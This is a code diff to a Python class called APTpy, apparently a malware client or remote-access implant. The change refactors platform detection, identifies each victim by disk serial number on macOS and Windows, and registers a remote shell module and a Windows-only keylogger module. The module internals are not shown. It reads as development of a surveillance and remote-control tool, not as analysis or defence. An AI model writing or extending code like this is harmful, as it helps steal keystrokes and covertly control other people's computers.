@@ -9,6 +9,7 @@ DEBUG = True
 
 class APTpy:
     def __init__(self):
+        self.platform = platform_system()
         self.client_id = None
         self.channel = None
         self.modules = []
@@ -96,16 +97,18 @@ class APTpy:
             raise inner_e
 
     def _checkenv(self):
-        if platform_system() == 'Darwin':
+        if self.platform == 'Darwin':
             import subprocess
             temp = subprocess.check_output(["ioreg -rd1 -w0 -c AppleAHCIDiskDriver | grep Serial"], shell=True)
             # '      "Serial Number" = "            XXXXXXXX"'
             temp = temp.strip().split('=')[1]
             disk = temp.replace('"', '').strip()
-        else:
+        elif self.platform == 'win32':
             from wmi import WMI
             info = WMI()
             disk = info.Win32_PhysicalMedia()[0].SerialNumber.strip()
+        else:
+            raise Exception("OS not supported")
 
         logging.getLogger('aptpy').info("[MAIN] Client id: " + disk)
         self.client_id = disk
@@ -122,8 +125,9 @@ class APTpy:
         self.events['ShellModule'] = Event()
         self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))
 
-        self.events['KeyloggerModule'] = Event()
-        self.modules.append(KeyloggerModule(self.queue_send, self.events['KeyloggerModule']))
+        if self.platform == 'win32':
+            self.events['KeyloggerModule'] = Event()
+            self.modules.append(KeyloggerModule(self.queue_send, self.events['KeyloggerModule']))
 try:
     obj = APTpy()
     obj.run()
